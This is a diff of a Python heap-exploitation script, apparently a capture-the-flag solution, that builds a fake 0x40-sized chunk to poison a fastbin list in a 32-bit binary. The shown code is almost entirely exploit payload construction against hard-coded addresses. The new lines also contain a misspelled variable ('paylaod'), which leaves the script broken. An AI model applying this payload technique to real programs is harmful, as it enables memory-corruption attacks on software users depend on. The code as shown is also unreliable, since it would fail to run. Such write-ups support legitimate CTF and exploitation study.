@@ -656,14 +656,13 @@ def exp():
     add(25 * 'a', payload)
     # before free, we need to bypass some check
     # fake chunk's size is 0x40
-    # 0x20 *'a' for padding the last fake chunk
-    # 0x40 for fake chunk's next chunk's prev_size
+    # 0x40 for fake chunk's next chunk's prev_size # not must
     # 0x100 for fake chunk's next chunk's size
-    # set fake iofle' next to be NULL
-    payload = 0x20 * '\x00' + p32(0x40) + p32(0x100)
-    payload = payload.ljust(52, 'b')
-    payload += p32(0)
-    payload = payload.ljust(128, 'c')
+    
+    # distance 0x0804a2c0 , 0x0804a2dc(0x0804a2a8's next chunk pointer) : 0x1c
+    payload = 0x1c * 'a' + p32(0) # set fake iofle' next to be NULL
+    paylaod += p32(0x40) + p32(0x100)
+    
     message(payload)
     # fastbin 0x40: 0x0804A2A0->some where heap->NULL
     order()
